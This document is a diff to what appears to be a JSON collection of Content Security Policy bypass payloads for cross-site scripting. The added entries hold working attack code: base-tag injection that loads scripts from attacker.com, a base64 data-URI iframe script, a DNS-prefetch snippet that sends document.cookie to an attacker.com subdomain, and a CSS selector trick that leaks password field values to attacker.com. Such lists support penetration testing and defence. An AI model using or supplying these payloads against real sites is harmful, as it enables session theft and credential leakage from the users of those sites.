@@ -1,7 +1,7 @@
 [
   {
-    "description": "CSP bypass via base-uri directive missing - inject base tag to rewrite relative URLs",
-    "code": "<base href=\"//attacker.com/\">\n<script src=/script.js></script>",
+    "description": "CSP bypass via missing base-uri directive - inject base tag to hijack relative URLs",
+    "code": "<base href=\"//attacker.com/\">\n<script src=/script.js></script>\n<base href=//attacker.com/>\n<script src=//app.js></script>",
     "browsers": ["chrome", "firefox", "edge", "safari"],
     "csp_bypass": true,
     "technique": "base-uri"
@@ -69,11 +69,11 @@
     "technique": "object-src"
   },
   {
-    "description": "CSP bypass via data: URI in script-src - base64 encoded XSS",
-    "code": "<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\"></script>",
-    "browsers": ["chrome", "firefox"],
+    "description": "CSP bypass via data: URI in iframe src with base64-encoded HTML document",
+    "code": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
     "csp_bypass": true,
-    "technique": "data-uri"
+    "technique": "data-uri-iframe"
   },
   {
     "description": "CSP bypass using blob: URI in script-src",
@@ -83,11 +83,11 @@
     "technique": "blob-uri"
   },
   {
-    "description": "CSP bypass using utf-7 encoding if charset not locked",
-    "code": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-7\">\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
-    "browsers": ["ie", "edge"],
+    "description": "CSP data exfiltration via DNS prefetch - DNS requests are not governed by connect-src",
+    "code": "<link rel=\"dns-prefetch\" href=\"//stolen-data.attacker.com\">\n<script>var l=document.createElement('link');l.rel='dns-prefetch';l.href='//'+document.cookie+'.attacker.com';document.head.appendChild(l)</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
     "csp_bypass": true,
-    "technique": "utf7-encoding"
+    "technique": "dns-prefetch-exfil"
   },
   {
     "description": "CSP bypass via report-uri endpoint with open redirect to external",
@@ -102,13 +102,6 @@
     "csp_bypass": true,
     "technique": "style-import",
     "note": "Requires missing style-src CSP or googleapis.com in style-src"
-  },
-  {
-    "description": "CSP bypass via base tag with // protocol",
-    "code": "<base href=//attacker.com/>\n<script src=//injected></script>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "csp_bypass": true,
-    "technique": "base-protocol"
   },
   {
     "description": "CSP bypass using link preload with script type",
@@ -199,10 +192,11 @@
     "technique": "fetch-open-redirect"
   },
   {
-    "description": "CSP bypass using svg animation to load external resource",
-    "code": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
-    "browsers": ["chrome", "firefox", "safari"],
-    "csp_bypass_note": "SVG elements can sometimes bypass strict CSP in certain configurations"
+    "description": "CSP data exfiltration via CSS attribute selectors when inline styles are allowed",
+    "code": "<style>input[type=password][value^=a]{background:url(//attacker.com/a)}</style>\n<input type=password value=secret>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "css-selector-exfil"
   },
   {
     "description": "CSP bypass using object tag with data URI",
